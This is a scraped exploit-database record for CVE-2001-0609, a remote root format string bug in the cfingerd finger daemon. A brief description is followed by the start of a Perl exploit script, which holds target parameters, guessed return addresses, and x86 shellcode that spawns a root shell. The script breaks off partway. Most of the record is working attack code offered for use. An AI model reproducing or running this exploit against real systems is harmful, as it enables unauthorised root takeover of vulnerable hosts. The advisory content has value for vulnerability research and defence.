{
    "text": "ecve : CVE-2001-0609 ， title : cfingerd 1.4 - Format String ( 1 ) - Linux remote Exploit ， verified : Verified ， exploit_detail : source :  ， A format string bug in the logging facility of the cfingerd \"Configurable Finger Daemon\" allows remote users to attain root privileges and execute arbitrary code. ， cfingerd queries and logs the remote username of users of the service. If an attacker sets up a remote machine that returns specific format strings instead of a valid username , and connects to cfingerd from that machine , he can exploit the format string bugs. Because cfingerd runs as root , this means the attacker gains full control of the cfingerd host. ， An exploit is available against x86 versions of cfingerd. ，  #  ! /usr/bin/perl ，  # Cfingerd exploit to the recent syslog format bug. ，  # Discovered and written by Lez <abullah @ freemail.hu> in 2001. ，  # you have to use it as root to bind port 113. ，  # tested on Debian 2.1 , 2.2 ， use IO :  : Socket ;  ，  # use strict ;  ， my $ network_timeout=5 ;  ， my $ sleep_between_fingers=2 ;  # should be enough ， my $ debug_sleep=0 ;  ， my $ fingerport=79 ;  ， my $ target= $ ARGV [ 0 ]  ;  ， my $ debug=1 ;  ， my $ test_vulnerability=1 ;  ，  # Debian 2.2 , cfingerd 1.4.1-1 ，  # my $ control=33 ;  # if don't set it , exploit will find. ，  # my $ align=0 ;  # the same ，  #  $ retaddr=0xbffffab0 ;  ，  # my $ retaddr=0xbffff880 ;  # the same ，  #  $ retaddr=0xbffff840 ;  ， my $ retvalue=0xbffff980 ;  # If it finds everything correctly , and says Shell lunched , but ，  # you can't find your uid 0 , decrease $ retvalue by 30. ， my $ bytes_written=32 ;  ，  #  $ control=17 ;  ，  #  $ align=0 ;  ，  #  $ retaddr=0xbffffb80 ;  #  ( or 0xbffffb68 0xbffff9d0 0xbffff9cc 0xbffff9c8 )  ，  #  $ retvalue=0xbffffc20 ;  ，  #  $ bytes_written=32 ;  ，  # GOOD :  ， my $ startsig11=0xbffffbfc ;  ， my $ endsig11= 0xbffff000 ;  ， my $ controlstart=45 ;  ， my $ controlend=1 ;  ， my $ fclient ;  ， my $ shellcode =\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x17\\xcd\\x80\\xb0\\x2e\\xcd\\x80\". ， \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\". ， \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\". ， \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\" ;  ，  # 59 bytes",
    "time": "2001-04-11"
}